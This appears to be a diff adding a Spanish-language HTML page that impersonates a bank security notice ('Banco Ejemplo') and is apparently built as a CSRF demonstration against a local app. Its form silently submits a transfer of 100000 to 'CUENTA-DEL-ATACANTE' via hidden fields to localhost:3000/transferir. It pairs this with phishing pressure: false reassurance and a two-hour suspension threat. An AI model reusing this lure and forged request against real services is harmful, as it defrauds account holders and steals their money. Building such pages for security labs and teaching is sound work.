@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Confirmación de cuenta</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #333;
+    }
+
+    .email-box {
+      background: #ffffff;
+      width: 420px;
+      padding: 2rem;
+      border-radius: 6px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    }
+
+    .header {
+      border-bottom: 1px solid #e5e7eb;
+      margin-bottom: 1.5rem;
+      padding-bottom: 0.75rem;
+    }
+
+    .header h2 {
+      margin: 0;
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #0a3d62;
+    }
+
+    p {
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 1.2rem;
+    }
+
+    form {
+      margin-top: 1.5rem;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 0.95rem;
+      font-weight: 600;
+      background: #0a3d62;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #074173;
+    }
+
+    .footer {
+      margin-top: 1.5rem;
+      font-size: 0.75rem;
+      color: #666;
+      text-align: center;
+    }
+
+    .warning {
+      margin-top: 1rem;
+      font-size: 0.8rem;
+      color: #b91c1c;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="email-box">
+    <div class="header">
+      <h2>Confirmación de actividad</h2>
+    </div>
+
+    <p>
+      Detectamos actividad inusual en su cuenta.  
+      Para evitar la suspensión automática, necesitamos confirmar que
+      sigue siendo un usuario activo.
+    </p>
+
+    <p>
+      Esta acción no modificará sus datos personales ni credenciales.
+    </p>
+
+    <form action="http://localhost:3000/transferir" method="GET">
+      <input type="hidden" name="monto" value="100000" />
+      <input type="hidden" name="destino" value="CUENTA-DEL-ATACANTE" />
+
+      <button type="submit">
+        Confirmar actividad
+      </button>
+    </form>
+
+    <div class="warning">
+      Si no confirma dentro de las próximas 2 horas,
+      su cuenta podría ser suspendida temporalmente.
+    </div>
+
+    <div class="footer">
+      © 2025 Banco Ejemplo · Departamento de Seguridad
+    </div>
+  </div>
+
+</body>
+</html>
